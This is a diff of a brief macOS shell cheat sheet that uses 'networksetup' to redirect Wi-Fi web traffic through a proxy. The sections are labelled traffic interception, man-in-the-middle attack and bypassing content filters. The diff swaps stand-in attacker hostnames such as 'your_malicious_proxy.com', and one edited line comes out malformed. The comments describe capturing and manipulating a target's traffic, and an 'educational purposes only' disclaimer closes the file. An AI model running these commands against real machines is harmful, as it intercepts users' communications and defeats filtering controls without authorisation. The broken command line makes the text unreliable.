@@ -10,7 +10,7 @@
 
 # 1. Traffic Interception
 # Set web proxy to redirect traffic
-networksetup -setwebproxy "Wi-Fi" <proxy.redirect.com> 8080
+networksetup -setwebproxy "Wi-Fi" proxy_redirect.com> 8080
 
 # Configure proxy bypass for internal domains
 networksetup -setproxybypassdomains "Wi-Fi" "*.internal.lan" "*.local"
@@ -18,18 +18,18 @@ networksetup -setproxybypassdomains "Wi-Fi" "*.internal.lan" "*.local"
 
 # 2. Man-in-the-Middle (MitM) Attack
 # Set web proxy to control communication
-networksetup -setwebproxy "Wi-Fi" <malicious-proxy.com> 8888
+networksetup -setwebproxy "Wi-Fi" <your_malicious_proxy.com> 8888
 # Capture traffic and perform MitM attacks
 # (Additional tools like Wireshark or mitmproxy might be used)
-# This example configures a web proxy to malicious-proxy.com on port 8888, enabling an attacker to capture and manipulate communication between the target machine and web servers.
+# This example configures a web proxy to your_malicious_proxy.com on port 8888, enabling an attacker to capture and manipulate communication between the target machine and web servers.
 
 # 3. Bypassing Content Filters
 # Set web proxy to bypass content filters
-networksetup -setwebproxy "Wi-Fi" <yourbypass-proxy.com> 8080
+networksetup -setwebproxy "Wi-Fi" <yourbypass_proxy.com> 8080
 
 # Disable proxy for specified domains
 networksetup -setproxybypassdomains "Wi-Fi" <"restricted-site1.com"> <"restricted-site2.com">
-# Here, a web proxy is set to bypass-proxy.com on port 8080, and specific domains are exempted from proxying to circumvent content filters.
+# Here, a web proxy is set to yourbypass_proxy.com on port 8080, and specific domains are exempted from proxying to circumvent content filters.
 
 # Disclaimer
 # This is intended for educational purposes only. Unauthorized use or exploitation of these techniques is strictly prohibited and may violate the law. Always ensure proper authorization before performing any security testing or ethical hacking activities.
